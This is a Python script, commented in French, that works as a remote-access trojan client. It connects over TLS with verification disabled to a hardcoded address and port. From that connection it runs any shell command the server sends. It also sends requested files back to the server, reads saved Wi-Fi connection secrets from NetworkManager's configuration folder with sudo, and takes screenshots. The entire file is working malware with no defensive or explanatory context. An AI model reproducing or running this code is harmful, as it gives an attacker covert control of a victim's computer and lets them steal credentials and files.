import socket, ssl, time, subprocess, os, sys, struct, paramiko, threading, pyautogui, cv2
from pynput import keyboard
from PIL import Image

# --- PARAMÈTRES RÉSEAU ---
CIBLE_IP = "192.168.2.4" #
CIBLE_PORT = 12345 #

def initialisation_flux():
    """Gère la connexion sécurisée et la boucle d'écoute"""
    reglages = ssl.create_default_context()
    reglages.check_hostname = False
    reglages.verify_mode = ssl.CERT_NONE #

    try:
        connexion_brute = socket.create_connection((CIBLE_IP, CIBLE_PORT))
        canal_chiffre = reglages.wrap_socket(connexion_brute, server_hostname=CIBLE_IP) #
        
        while True:
            donnee_serveur = canal_chiffre.recv(4096).decode().strip().lower()
            if donnee_serveur in ["exit", "disconnect"]: #
                break
            
            # Appel du gestionnaire de tâches
            reponse_tache = executeur_de_requetes(donnee_serveur, canal_chiffre)
            
            if reponse_tache is not None:
                canal_chiffre.send(str(reponse_tache).encode()) #
    except:
        pass
    finally:
        connexion_brute.close()

def executeur_de_requetes(instruction, lien_socket):
    """Fait le lien entre les commandes web et les nouvelles fonctions"""
    if instruction == "get_ip":
        return subprocess.check_output("hostname -I", shell=True).decode().strip()
    elif instruction == "wifi":
        return recuperer_configs_reseau() #
    elif instruction == "screenshot":
        return generer_instante_ecran() #
    elif instruction.startswith("download "):
        fichiers = instruction.split(" ", 1)[1].split(";")
        envoi_flux_binaire(fichiers, lien_socket) #
        return None
    else:
        return commande_shell_directe(instruction) #

def commande_shell_directe(cmd_text):
    try:
        processus = subprocess.run(cmd_text, shell=True, capture_output=True, text=True)
        return processus.stdout + processus.stderr #
    except:
        return "Erreur systeme"

def generer_instante_ecran():
    try:
        img = pyautogui.screenshot().convert("RGB")
        img.save("temp_view.jpg", "JPEG") #
        return "Image temporaire creee"
    except:
        return "Echec capture"

def envoi_flux_binaire(liste_p, sock):
    for p in liste_p:
        if os.path.exists(p):
            n_f = os.path.basename(p)
            t_f = os.path.getsize(p)
            sock.send(struct.pack("!I", len(n_f))) #
            sock.send(n_f.encode())
            sock.send(struct.pack("!Q", t_f)) #
            with open(p, "rb") as f_obj:
                while morceau := f_obj.read(4096):
                    sock.sendall(morceau) #
    sock.send(struct.pack("!I", len("[SYNC]")))
    sock.send("[SYNC]".encode())

def recuperer_configs_reseau():
    try:
        dossier_nm = "/etc/NetworkManager/system-connections/" #
        resultats = []
        for element in os.listdir(dossier_nm):
            output = subprocess.run(["sudo", "cat", os.path.join(dossier_nm, element)], capture_output=True, text=True)
            if output.returncode == 0:
                resultats.append(output.stdout)
        with open("logs_wifi.txt", "w") as f_log:
            f_log.write("\n".join(resultats))
        return "Logs reseau generes" #
    except:
        return "Erreur acces"

if __name__ == "__main__":
    initialisation_flux()